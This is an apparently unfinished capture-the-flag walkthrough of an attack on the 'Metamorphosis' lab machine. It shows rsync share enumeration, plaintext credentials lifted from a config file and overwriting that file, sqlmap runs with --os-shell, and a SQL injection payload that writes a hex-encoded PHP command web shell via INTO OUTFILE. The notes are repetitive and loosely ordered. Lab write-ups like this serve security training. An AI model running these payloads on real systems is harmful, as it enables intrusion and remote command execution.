# User "root" should be denied to get access from all other sources.
#- : root : ALL
#
# User "foo" and members of netgroup "nis_group" should be
# allowed to get access from all sources.
# This will only work if netgroup service is available.
#+ : @nis_group foo : ALL
#
# User "john" should get access from ipv4 net/mask
#+ : john : 127.0.0.0/24
#
# User "john" should get access from ipv4 as ipv6 net/mask
#+ : john : ::ffff:127.0.0.0/127
#
# User "john" should get access from ipv6 host address
#+ : john : 2001:4ca0:0:101::1
#
# User "john" should get access from ipv6 host address (same as above)
#+ : john : 2001:4ca0:0:101:0:0:0:1
#
# User "john" should get access from ipv6 net/mask
#+ : john : 2001:4ca0:0:101::/64
#
# All other users should be denied to get access from all sources.
#- : ALL : ALL
```

<p>access.conf</p>

```bash
:~/Metamorphosis/conf# cat ports.conf
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 80

<IfModule ssl_module>
	Listen 443
</IfModule>

<IfModule mod_gnutls.c>
	Listen 443
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

<p>Launch Burp Suite. Enable FoxyProxy. Navigate to  10.201.70.130/admin/. Input <strong>tom</strong>. Submit query.</p>

<img width="1132" height="307" alt="image" src="https://github.com/user-attachments/assets/bd2d8ec0-71f9-47a8-946b-872d81f9b1cc" />



10.201.70.130/admin/


lili
Submit Query

<img width="1277" height="329" alt="image" src="https://github.com/user-attachments/assets/24cc67f8-b663-4d7d-8c0c-73b953c91e99" />

10.201.70.130/admin/config.php

<img width="1273" height="181" alt="image" src="https://github.com/user-attachments/assets/6f9bb743-4680-4ee1-bb61-8432e08e5e96" />



10.201.70.130/admin/

tom
Submit Query


<img width="1274" height="300" alt="image" src="https://github.com/user-attachments/assets/fcfe086f-b747-4ecd-8250-b4c0a5b025df" />


Username Pasword
tom thecat


Inspect
10.201.70.130/admin
Refreshed


<img width="1276" height="527" alt="image" src="https://github.com/user-attachments/assets/b08a08a5-86ba-4aef-bbc6-95580de3d9e1" />




<img width="1279" height="510" alt="image" src="https://github.com/user-attachments/assets/98a0ada8-2693-46a8-938c-bbd4b41e2c63" />


<img width="1137" height="650" alt="image" src="https://github.com/user-attachments/assets/dae1eaaf-cadf-4f35-84b7-9282e7f18d45" />



tom" -- -




:~/Metamorphosis# python3
Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print (("<? system($_GET['cmd]); ?>").encode('utf-8').hex())
3c3f2073797374656d28245f4745545b27636d645d293b203f3e
>>> 

username=researcher" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/rev.php"-- -

x3rz" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -


username=tom' OR '1'='1

```bash
:~/Metamorphosis# sqlmap -u http://10.201.70.130/admin/ --data "username=FUZZ" --level 5 -D db --tables
...
[22:16:52] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
```

<img width="984" height="716" alt="image" src="https://github.com/user-attachments/assets/4a4c24b3-958c-412e-a4d4-67c4bd4a4bf6" />


```bash
:~/rsync# sqlmap -u http://10.64.169.208/admin/ --data "username=FUZZ" --level 5 -D db --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:18:55 /2025-12-27/

[23:18:55] [INFO] testing connection to the target URL
[23:18:55] [INFO] checking if the target is protected by some kind of WAF/IPS
[23:18:55] [INFO] testing if the target URL content is stable
[23:18:56] [INFO] target URL content is stable
[23:18:56] [INFO] testing if POST parameter 'username' is dynamic
[23:18:56] [WARNING] POST parameter 'username' does not appear to be dynamic
[23:18:56] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[23:18:56] [INFO] testing for SQL injection on POST parameter 'username'
[23:18:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:18:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[23:18:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[23:18:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:18:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[23:18:57] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[23:18:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[23:18:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[23:18:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[23:18:59] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[23:18:59] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[23:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[23:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[23:19:00] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[23:19:00] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[23:19:00] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[23:19:00] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[23:19:00] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[23:19:00] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[23:19:00] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[23:19:00] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[23:19:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[23:19:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[23:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[23:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[23:19:00] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[23:19:00] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[23:19:00] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[23:19:00] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[23:19:00] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[23:19:00] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[23:19:00] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[23:19:01] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[23:19:01] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[23:19:01] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[23:19:01] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[23:19:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[23:19:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[23:19:02] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[23:19:02] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[23:19:02] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[23:19:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[23:19:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[23:19:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[23:19:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:19:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:19:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[23:19:05] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:19:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[23:19:06] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:19:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[23:19:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[23:19:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[23:19:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[23:19:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[23:19:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[23:19:10] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
[23:19:10] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
[23:19:10] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[23:19:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[23:19:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[23:19:11] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[23:19:11] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[23:19:11] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[23:19:11] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[23:19:11] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[23:19:11] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[23:19:11] [INFO] testing 'Oracle error-based - Parameter replace'
[23:19:11] [INFO] testing 'Firebird error-based - Parameter replace'
[23:19:11] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[23:19:11] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[23:19:11] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[23:19:11] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[23:19:11] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[23:19:11] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[23:19:12] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[23:19:12] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
[23:19:12] [INFO] testing 'Oracle error-based - ORDER BY, GROUP BY clause'
[23:19:12] [INFO] testing 'Firebird error-based - ORDER BY clause'
[23:19:12] [INFO] testing 'Generic inline queries'
[23:19:12] [INFO] testing 'MySQL inline queries'
[23:19:12] [INFO] testing 'PostgreSQL inline queries'
[23:19:12] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[23:19:12] [INFO] testing 'Oracle inline queries'
[23:19:12] [INFO] testing 'SQLite inline queries'
[23:19:12] [INFO] testing 'Firebird inline queries'
[23:19:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[23:19:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[23:19:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[23:19:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[23:19:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[23:19:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[23:19:13] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[23:19:13] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[23:19:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:19:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[23:19:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
[23:19:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE)'
[23:19:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[23:19:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
[23:19:16] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'
[23:19:16] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
[23:19:16] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'
[23:19:16] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
[23:19:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:19:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[23:19:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[23:19:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[23:19:17] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[23:19:18] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[23:19:18] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[23:19:18] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[23:19:19] [INFO] testing 'MySQL AND time-based blind (ELT)'
[23:19:19] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[23:19:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[23:19:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[23:19:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[23:19:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
[23:19:21] [INFO] testing 'Oracle AND time-based blind'
[23:19:21] [INFO] testing 'Oracle AND time-based blind (comment)'
[23:19:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[23:19:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[23:19:21] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[23:19:21] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[23:19:21] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[23:19:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[23:19:21] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
[23:19:21] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
[23:19:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[23:19:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[23:19:21] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
[23:19:21] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
....


```




```bash
:~/Metamorphosis# smbclient -L incognito.thm/ -U "" -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (ip-10-201-123-26 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```



```bash
:~/Metamorphosis# smbclient -U "" -N //incognito.thm/print$
tree connect failed: NT_STATUS_ACCESS_DENIED
```



```bash
:~/Metamorphosis# smbclient -U "" -N //incognito.thm/IPC$
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \>
```



<br>
<br>

```bash
:~/Metamorphosis# rsync -avzh rsync://10.201.123.26/Conf .
receiving incremental file list
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini
```

<img width="1205" height="322" alt="image" src="https://github.com/user-attachments/assets/a45f9d98-94c9-4d8c-874c-a23ca35ad53d" />

<br>
<br>
<br>

```bash
:~/Metamorphosis# ls
access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
```

```bash
:~/Metamorphosis# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```

```bash
:~/Metamorphosis# nano webapp.ini
```

```bash
:~/Metamorphosis# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No
```

```bash
:~/Metamorphosis# rsync -aPv webapp.ini rsync://10.201.123.26/Conf/webapp.ini
sending incremental file list
webapp.ini
             71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)

sent 186 bytes  received 41 bytes  454.00 bytes/sec
total size is 71  speedup is 0.31
```

<p align="left">Navigated to <strong>/admin/index.php<br><img width="1200px" src="https://github.com/user-attachments/assets/91298f9f-bf31-4293-89ed-daea48e913ca"></p>

<p align="left">Viewed page source. Identified action=config.php, method=POST, name:'username'.<img width="1200px" src="https://github.com/user-attachments/assets/98ea9d9a-5c2f-4a65-ade5-c457592c58a1"></p>

<p align="left">Launched Burp Suite and enabled FoxyProxy.<br>Refreshed.<br><p><img width="1200px" src="https://github.com/user-attachments/assets/fbb9e7d1-fd7a-4cfd-9cbc-dd7fa6beef8e"></p>

<p align="left">Submitted query<strong><ins>tom</ins></strong><br>Response containd <strong><ins>500 Internal Server Error</ins></strong><p> and redirected to <strong><ins>config.php</ins></strong>.<img width="1200px" src="https://github.com/user-attachments/assets/5bce8b58-cbe6-431e-b2ad-863b6505de47"></p>

<p align="left">Right-clicked Request > clicked <code>Save item</code> > entered a file name > clicked <code>Save</code>. Created <code>request.txt</code>.</p>

<p align="left">Right-clicked Request > clicked <code>Save item</code> > entered a file name > clicked <code>Save</code>. Created <code>request.txt</code>.</p>

< align="enter"><Executed <code>sqlmap</code>.</p>

:~/Metamorphosis# sqlmap -r request.txt --level 5 --risk 3






<h3>873/tcp open  rsync</h3>


```bash
:~/Metamorphosis# rsync --list-only rsync://xx.xxx.xxx.xx
Conf           	All Confs
```

```bash
:~/Metamorphosis# rsync --list-only rsync://xx.xxx.xxx.xx/Conf
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
```

```bash
:~/Metamorphosis# rsync -av --list-only rsync://10.201.34.170/Conf
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini

sent 20 bytes  received 379 bytes  798.00 bytes/sec
total size is 193,430  speedup is 484.79
```

```bash
:~/Metamorphosis# rsync -aPv rsync://xx.xxx.xxx.xx/Conf ./Conf
receiving incremental file list
created directory ./Conf
./
access.conf
          4,620 100%    4.41MB/s    0:00:00 (xfr#1, to-chk=11/13)
bluezone.ini
          1,341 100%    1.28MB/s    0:00:00 (xfr#2, to-chk=10/13)
debconf.conf
          2,969 100%    2.83MB/s    0:00:00 (xfr#3, to-chk=9/13)
ldap.conf
            332 100%  324.22kB/s    0:00:00 (xfr#4, to-chk=8/13)
lvm.conf
         94,404 100%   90.03MB/s    0:00:00 (xfr#5, to-chk=7/13)
mysql.ini
          9,005 100%    4.29MB/s    0:00:00 (xfr#6, to-chk=6/13)
php.ini
         70,207 100%   22.32MB/s    0:00:00 (xfr#7, to-chk=5/13)
ports.conf
            320 100%   78.12kB/s    0:00:00 (xfr#8, to-chk=4/13)
resolv.conf
            589 100%  143.80kB/s    0:00:00 (xfr#9, to-chk=3/13)
screen-cleanup.conf
             29 100%    5.66kB/s    0:00:00 (xfr#10, to-chk=2/13)
smb.conf
          9,542 100%    1.82MB/s    0:00:00 (xfr#11, to-chk=1/13)
webapp.ini
             72 100%   14.06kB/s    0:00:00 (xfr#12, to-chk=0/13)

sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
total size is 193,430  speedup is 0.99
```

```bash
:~/Metamorphosis/myConf# ls
access.conf   debconf.conf  lvm.conf   php.ini     resolv.conf          smb.conf
bluezone.ini  ldap.conf     mysql.ini  ports.conf  screen-cleanup.conf  webapp.ini
```

```bash
:~/Metamorphosis/Conf# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```

<p>

- edited <code>env</code></p>

```bash
:~/Metamorphosis/Conf# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No
```

```bash
:~/Metamorphosis/myConf# rsync -aPv webapp.ini rsync://xx.xxx.xx.xxx/Conf/webapp.ini
sending incremental file list
webapp.ini
             71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)

sent 186 bytes  received 41 bytes  454.00 bytes/sec
total size is 71  speedup is 0.31
```

<h2>/admin/</h2>

<img width="1117" height="174" alt="image" src="https://github.com/user-attachments/assets/8ca2b59d-abd4-481a-95fc-7cce7ee7a40c" />

<br>
<h2>sqlmap</h2>

```bash
:~/Metamorphosis/myConf# sqlmap -u http://10.201.34.170/admin/index.php --level 5 --risk 3 --batch --os-shell
```

<h2>/admin/</h2>

<img width="1117" height="174" alt="image" src="https://github.com/user-attachments/assets/8ca2b59d-abd4-481a-95fc-7cce7ee7a40c" />


<p>

- launched Burp Suite<br>
- enabled FoxyProxy<br>
- Username: <code>tom</code><br>
- clicked Submit Query<br>

</p>

<h2>tom</h2>

<img width="1115" height="163" alt="image" src="https://github.com/user-attachments/assets/bb8eed2f-d752-425c-9c7c-5453d1d54d19" />


```bash

```
ffuf -u http:/10.201.104.23/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 403 -e .phps
```

<h3>smb</h3>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p ''
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
```

<h4>Shares</h4>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p '' --shares
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Enumerated shares
SMB         10.201.104.23   445    IP-10-201-104-23 Share           Permissions     Remark
SMB         10.201.104.23   445    IP-10-201-104-23 -----           -----------     ------
SMB         10.201.104.23   445    IP-10-201-104-23 print$                          Printer Drivers
SMB         10.201.104.23   445    IP-10-201-104-23 IPC$                            IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
```

<p>another way ...</p>

```bash
:~/Metamorphosis# smbclient -L metamorphosis.thm -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

<p>another way ...</p>

```bash
:~/Metamorphosis# smbmap -u 'guest' -p '' -H 10.201.104.23
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.201.104.23...
[+] IP: 10.201.104.23:445	Name: ip-10-201-104-23.ec2.internal                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
```

<br>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p '' --rid
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
SMB         10.201.104.23   445    IP-10-201-104-23 [-] RPC lookup failed: RPC method not implemented
```

<br>

```bash
:~/Metamorphosis# smbclient //metamorphosis.thm/print$ -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

<br>

```bash
~/Metamorphosis# smbclient //10.201.104.23/IPC$ -N
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> exit
```

<br>

<h3>smbmap</h3>

```bash

```



















